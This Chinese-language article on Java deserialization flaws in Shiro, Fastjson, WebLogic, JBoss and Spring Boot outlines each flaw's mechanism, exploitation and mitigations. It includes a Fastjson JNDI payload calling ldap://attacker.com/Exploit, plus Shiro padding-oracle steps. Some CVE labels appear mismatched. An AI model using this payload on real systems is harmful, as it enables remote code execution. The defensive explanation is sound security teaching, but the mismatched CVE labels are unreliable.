四、典型系统与框架中的反序列化利用

本章将介绍在实际攻击中被广泛利用的典型 Java 系统、框架和中间件中存在的反序列化漏洞及其利用方式。

1. Apache Shiro

  • 漏洞编号：CVE-2016-4437（Shiro721）
  • 漏洞机制：
    • Shiro 使用 AES-CBC 加密 rememberMe Cookie；
    • 攻击者可通过 Padding Oracle 攻击猜解密钥；
    • 构造反序列化 payload 注入到 Cookie 中，触发命令执行。
  • 利用方式：
    1. 获取合法用户 Cookie；
    2. 使用 Padding Oracle 工具逐字节构造合法密文；
    3. 插入 CommonsCollections payload 触发反序列化；
  • 常用利用链：CommonsCollections1, 2, 6 等；
  • 安全建议：
    • 设置强随机密钥，定期更换；
    • 禁用 rememberMe 或启用白名单类反序列化。

2. Fastjson

  • 常见漏洞：AutoType 任意类加载（如 CVE-2017-18318）

  • 漏洞机制：

    • Fastjson 默认支持 @type 动态类加载；
    • 某些类（如 JdbcRowSetImpl）加载时会执行恶意代码；
    • 可搭配 LDAP、RMI 等 JNDI 服务实现远程命令执行。

  • 典型 payload：

    {
    “@type”: “com.sun.rowset.JdbcRowSetImpl”,
    “dataSourceName”: “ldap://attacker.com/Exploit”,
    “autoCommit”: true
    }

    影响版本：1.2.24 ~ 1.2.67 等多个版本；

    安全建议：

    升级至最新版；

    显式禁用 AutoType；

    配置白名单类。

3.WebLogic常见漏洞：

T3 反序列化（CVE-2019-2725、CVE-2020-2551）；

XMLDecoder 任意代码执行；

JMXInvokerServlet 利用。

漏洞机制：

WebLogic 使用 T3 协议接收远程序列化对象；

无鉴权下可触发反序列化漏洞；

典型利用点：

T3 协议端口；

/wls-wsat/CoordinatorPortType；

安全建议：

禁用不必要端口和服务；

配置反序列化白名单；

更新官方补丁。

4.JBoss漏洞组件：

JBossMQ；

JMXInvokerServlet；

InvokerTransformer Gadget；

漏洞机制：

JBoss 支持远程调用，通过反序列化处理请求；

早期版本未限制反序列化类；

常用利用链：

CommonsCollections、BeanShell、Groovy；

安全建议：

限制远程管理接口访问；

升级版本或使用 Red Hat 补丁；

关闭不必要模块。

5.Spring Boot潜在风险：

Jackson 或 Fastjson 用于请求参数解析；

自动绑定对象可能触发反序列化风险；

漏洞机制：

使用 @JsonTypeInfo(use = Id.CLASS) 时允许动态类绑定；

请求中指定恶意类名可导致任意代码加载；

示例风险点：

直接接收 JSON 字符串映射任意类型；

SpringBoot Actuator 开启时某些端点可能暴露；

安全建议：

禁用 Jackson 动态类型解析；

绑定强类型对象；

限制管理接口访问。

五、防护建议与检测手段

1. 编码层防御

  • 禁用 ObjectInputStream
  • 开启类白名单（JEP 290）

2. 配置与权限防护

  • 禁用 RMI / T3 / JNDI 加载
  • 使用安全组件替代反序列化

3. 运行时与日志检测

  • 行为监控（EDR、HIDS）
  • WebShell / 内存马扫描

4. 常用检测工具推荐

  • MemoryShell Scanner
  • FindShiroKey
  • jtool / javassist
